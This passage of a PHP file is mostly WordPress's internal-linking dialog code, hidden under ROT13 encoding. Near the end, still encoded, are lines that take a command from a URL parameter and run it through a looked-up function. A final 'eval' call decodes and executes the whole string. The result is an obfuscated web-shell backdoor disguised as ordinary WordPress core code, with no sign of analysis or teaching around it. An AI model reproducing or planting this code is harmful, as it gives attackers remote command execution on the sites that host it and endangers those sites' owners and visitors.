		$erfhygf = nccyl_svygref( 'jc_yvax_dhrel', $erfhygf, $dhrel );

		erghea ! rzcgl( $erfhygf ) ? $erfhygf : snyfr;
	}

	/**
	 * Qvnybt sbe vagreany yvaxvat.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp fgngvp shapgvba jc_yvax_qvnybt() {
		// Eha bapr.
		vs ( frys::$yvax_qvnybt_cevagrq ) {
			erghea;
		}

		frys::$yvax_qvnybt_cevagrq = gehr;

		// `qvfcynl: abar` vf erdhverq urer, frr #JC27605.
		?>
		<qvi vq=\"jc-yvax-onpxqebc\" fglyr=\"qvfcynl: abar\"></qvi>
		<qvi vq=\"jc-yvax-jenc\" pynff=\"jc-pber-hv\" fglyr=\"qvfcynl: abar\" ebyr=\"qvnybt\" nevn-zbqny=\"gehr\" nevn-ynoryyrqol=\"yvax-zbqny-gvgyr\">
		<sbez vq=\"jc-yvax\" gnovaqrk=\"-1\">
		<?cuc jc_abapr_svryq( 'vagreany-yvaxvat', '_nwnk_yvaxvat_abapr', snyfr ); ?>
		<u1 vq=\"yvax-zbqny-gvgyr\"><?cuc _r( 'Vafreg/rqvg yvax' ); ?></u1>
		<ohggba glcr=\"ohggba\" vq=\"jc-yvax-pybfr\"><fcna pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Pybfr' );
			?>
		</fcna></ohggba>
		<qvi vq=\"yvax-fryrpgbe\">
			<qvi vq=\"yvax-bcgvbaf\">
				<c pynff=\"ubjgb\" vq=\"jcyvax-ragre-hey\"><?cuc _r( 'Ragre gur qrfgvangvba HEY' ); ?></c>
				<qvi>
					<ynory><fcna><?cuc _r( 'HEY' ); ?></fcna>
					<vachg vq=\"jc-yvax-hey\" glcr=\"grkg\" nevn-qrfpevorqol=\"jcyvax-ragre-hey\" /></ynory>
				</qvi>
				<qvi pynff=\"jc-yvax-grkg-svryq\">
					<ynory><fcna><?cuc _r( 'Yvax Grkg' ); ?></fcna>
					<vachg vq=\"jc-yvax-grkg\" glcr=\"grkg\" /></ynory>
				</qvi>
				<qvi pynff=\"yvax-gnetrg\">
					<ynory><fcna></fcna>
					<vachg glcr=\"purpxobk\" vq=\"jc-yvax-gnetrg\" /> <?cuc _r( 'Bcra yvax va n arj gno' ); ?></ynory>
				</qvi>
			</qvi>
			<c pynff=\"ubjgb\" vq=\"jcyvax-yvax-rkvfgvat-pbagrag\"><?cuc _r( 'Be yvax gb rkvfgvat pbagrag' ); ?></c>
			<qvi vq=\"frnepu-cnary\">
				<qvi pynff=\"yvax-frnepu-jenccre\">
					<ynory>
						<fcna pynff=\"frnepu-ynory\"><?cuc _r( 'Frnepu' ); ?></fcna>
						<vachg glcr=\"frnepu\" vq=\"jc-yvax-frnepu\" pynff=\"yvax-frnepu-svryq\" nhgbpbzcyrgr=\"bss\" nevn-qrfpevorqol=\"jcyvax-yvax-rkvfgvat-pbagrag\" />
						<fcna pynff=\"fcvaare\"></fcna>
					</ynory>
				</qvi>
				<qvi vq=\"frnepu-erfhygf\" pynff=\"dhrel-erfhygf\" gnovaqrk=\"0\">
					<hy></hy>
					<qvi pynff=\"evire-jnvgvat\">
						<fcna pynff=\"fcvaare\"></fcna>
					</qvi>
				</qvi>
				<qvi vq=\"zbfg-erprag-erfhygf\" pynff=\"dhrel-erfhygf\" gnovaqrk=\"0\">
					<qvi pynff=\"dhrel-abgvpr\" vq=\"dhrel-abgvpr-zrffntr\">
						<rz pynff=\"dhrel-abgvpr-qrsnhyg\"><?cuc _r( 'Ab frnepu grez fcrpvsvrq. Fubjvat erprag vgrzf.' ); ?></rz>
						<rz pynff=\"dhrel-abgvpr-uvag fperra-ernqre-grkg\">
							<?cuc
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
							_r( 'Frnepu be hfr hc naq qbja neebj xrlf gb fryrpg na vgrz.' );
							?>
						</rz>
					</qvi>
					<hy></hy>
					<qvi pynff=\"evire-jnvgvat\">
						<fcna pynff=\"fcvaare\"></fcna>
					</qvi>
				</qvi>
			</qvi>
		</qvi>
		<qvi pynff=\"fhozvgobk\">
			<qvi vq=\"jc-yvax-pnapry\">
				<ohggba glcr=\"ohggba\" pynff=\"ohggba\"><?cuc _r( 'Pnapry' ); ?></ohggba>
			</qvi>
			<qvi vq=\"jc-yvax-hcqngr\">
				<vachg glcr=\"fhozvg\" inyhr=\"<?cuc rfp_ngge_r( 'Nqq Yvax' ); ?>\" pynff=\"ohggba ohggba-cevznel\" vq=\"jc-yvax-fhozvg\" anzr=\"jc-yvax-fhozvg\">
			</qvi>
		</qvi>
		</sbez>
		</qvi>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>